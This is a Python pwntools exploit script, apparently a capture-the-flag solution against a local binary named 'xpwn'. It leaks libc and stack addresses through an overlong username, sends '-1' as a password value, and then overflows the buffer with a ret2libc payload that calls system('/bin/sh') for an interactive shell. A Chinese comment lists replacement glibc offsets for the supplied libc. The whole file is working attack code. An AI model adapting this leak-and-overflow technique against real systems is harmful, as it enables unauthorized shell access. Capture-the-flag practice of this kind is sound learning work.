from pwn import *
context.log_level = 'debug'
p = process('./xpwn')
p.recvuntil('username: ')
junk = 'a'*60
p.send(junk)
p.recvuntil(junk)
setbuf_libc = u32(p.recv(4))
p.recv(8)
stack_main = u32(p.recv(4))
libc_basic = setbuf_libc-0x70030
getshell = libc_basic+0x3E80e
shellStr = libc_basic+0x0017FAAA
'''
上面写的地址是我本地linux的glibc中的值
给的文件中
setbuf：0x00065450
getshell: 0x0005F06D
/bin/sh: 0x0015902C
将数字替换就好了
'''
success("setbuf in glibc => "+hex(setbuf_libc))
success("stack in main =>"+hex(stack_main))
success("glibc basic => "+hex(libc_basic))
success("system address =>"+hex(getshell))
p.recvuntil("password: ")
p.send("-1")
p.recvuntil(": ")
payload = 'a'*68+p32(stack_main+24)+'a'*24 + \
    p32(getshell)+p32(shellStr)+p32(0)+p32(0)+p32(0)
p.send(payload)
p.interactive()
